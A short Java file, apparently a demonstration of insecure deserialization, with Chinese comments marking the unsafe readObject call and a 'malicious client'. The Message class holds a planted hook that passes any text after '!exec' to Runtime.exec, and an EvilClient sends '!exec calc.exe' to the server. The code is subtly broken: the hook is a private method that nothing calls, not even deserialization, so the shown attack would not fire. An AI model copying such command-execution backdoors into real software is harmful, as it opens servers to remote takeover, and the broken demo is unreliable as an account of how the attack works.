import java.io.*;
import java.net.*;
import java.util.*;

class Message implements Serializable {
    private String content;
    private String username;
    private Date timestamp;

    public Message(String username, String content) {
        this.username = username;
        this.content = content;
        this.timestamp = new Date();
    }

    private void setMessageContent(String content) {
        this.content = content;
        if (content.startsWith("!exec")) {
            try {
                Runtime.getRuntime().exec(content.substring(5));
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    public String toString() {
        return "[" + timestamp + "] " + username + ": " + content;
    }
}

public class ChatServer {
    public static void main(String[] args) {
        try {
            ServerSocket ss = new ServerSocket(9001);
            System.out.println("Chat server started...");

            while (true) {
                Socket socket = ss.accept();
                ObjectInputStream ois = new ObjectInputStream(socket.getInputStream());
                
                // 不安全的反序列化操作
                Message msg = (Message) ois.readObject();
                System.out.println("Received: " + msg);
                
                ois.close();
                socket.close();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

// 恶意客户端示例
class EvilClient {
    public static void main(String[] args) {
        try {
            Socket socket = new Socket("127.0.0.1", 9001);
            ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream());
            
            // 创建恶意Message对象
            Message evilMsg = new Message("hacker", "!exec calc.exe");
            oos.writeObject(evilMsg);
            oos.flush();
            oos.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}